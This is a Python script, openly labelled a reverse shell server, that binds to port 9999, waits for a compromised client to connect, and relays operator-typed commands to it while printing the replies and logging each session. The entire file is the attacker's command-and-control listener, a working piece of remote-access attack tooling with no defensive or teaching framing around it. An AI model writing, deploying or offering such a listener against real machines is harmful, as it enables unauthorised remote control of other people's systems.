import socket
import sys
import datetime
import os

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    # Print to console
    print(log_entry.strip())
    
    # Write to log file
    try:
        with open("server.log", "a") as log_file:
            log_file.write(log_entry)
    except Exception as e:
        print(f"Warning: Could not write to log file: {e}")

# Create socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
        log_message(f"Socket created successfully on port {port}")
        return True

    except socket.error as msg:
        log_message(f"Socket creation error: {str(msg)}", "ERROR")
        return False

# Binding socket to port
def bind_socket():
    try:
        global host
        global port
        global s

        log_message(f"Attempting to bind to port {port}...")
        s.bind((host, port))
        s.listen(5)
        log_message(f"Socket bound successfully. Listening for connections...")
        return True

    except socket.error as msg:
        log_message(f"Socket binding error: {str(msg)}", "ERROR")
        log_message("Retrying in 5 seconds...", "WARNING")
        import time
        time.sleep(5)
        bind_socket()
    except Exception as e:
        log_message(f"Unexpected error during binding: {str(e)}", "ERROR")
        return False

# Establish connection with a client
def socket_accept():
    try:
        log_message("Waiting for incoming connections...")
        conn, address = s.accept()
        log_message(f"Connection established! IP: {address[0]} | Port: {address[1]}")
        
        # Send commands to connected client
        send_command(conn, address)
        
    except KeyboardInterrupt:
        log_message("Server interrupted by user (Ctrl+C)", "WARNING")
        cleanup()
    except socket.error as e:
        log_message(f"Socket accept error: {str(e)}", "ERROR")
        socket_accept()  # Try accepting again
    except Exception as e:
        log_message(f"Unexpected error: {str(e)}", "ERROR")
    finally:
        try:
            conn.close()
            log_message("Client connection closed")
        except:
            pass

# Send commands to client
def send_command(conn, address):
    try:
        while True:
            cmd = input()
            
            if cmd == 'quit':
                log_message("Quit command received. Shutting down...", "WARNING")
                conn.close()
                s.close()
                sys.exit()
            
            if len(str.encode(cmd)) > 0:
                try:
                    conn.send(str.encode(cmd))
                    log_message(f"Command sent to {address[0]}: {cmd}")
                    
                    # Receive response from client
                    client_response = str(conn.recv(1024), "utf-8")
                    print(client_response, end="")
                    
                except socket.error as e:
                    log_message(f"Error sending/receiving data: {str(e)}", "ERROR")
                    log_message("Client disconnected", "WARNING")
                    break
                except Exception as e:
                    log_message(f"Unexpected error during command execution: {str(e)}", "ERROR")
                    
    except KeyboardInterrupt:
        log_message("Command session interrupted", "WARNING")
    except Exception as e:
        log_message(f"Error in send_command: {str(e)}", "ERROR")

# Cleanup function
def cleanup():
    try:
        s.close()
        log_message("Server socket closed successfully")
    except:
        pass
    sys.exit()

def main():
    log_message("=" * 50)
    log_message("Reverse Shell Server Starting...")
    log_message("=" * 50)
    
    if not create_socket():
        log_message("Failed to create socket. Exiting...", "ERROR")
        sys.exit(1)
    
    if not bind_socket():
        log_message("Failed to bind socket. Exiting...", "ERROR")
        sys.exit(1)
    
    socket_accept()

if __name__ == "__main__":
    main()